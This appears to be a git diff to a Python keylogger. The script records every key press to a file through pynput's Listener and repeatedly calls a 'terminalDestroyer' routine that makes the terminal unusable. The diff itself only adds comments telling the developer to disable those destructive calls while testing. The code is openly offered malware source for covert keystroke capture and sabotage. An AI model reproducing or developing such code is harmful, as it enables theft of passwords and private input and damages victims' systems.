@@ -18,6 +18,7 @@ def on_press(key):
             file.write(f"{key}\n")
     except Exception as e:
         print(f"Error logging keystroke: {e}")
+# While testing comment the line below this...
         run_forever(make_terminal_unusable.terminalDestroyer())
 
 
@@ -26,6 +27,8 @@ def start_keylogger():
     try:
         with Listener(on_press=on_press) as listener:
             listener.join()
+
+# While testing the KeyLogger comment the two lines below this...
     except Exception:
         make_terminal_unusable.terminalDestroyer()
 
@@ -34,6 +37,8 @@ if __name__ == "__main__":
         on_press(key=Key.enter)  # Start logging with a dummy key press
         start_keylogger()
 
+
+# While testing the KeyLogger comment out the part below this...
 
     except Exception:
         make_terminal_unusable.terminalDestroyer()
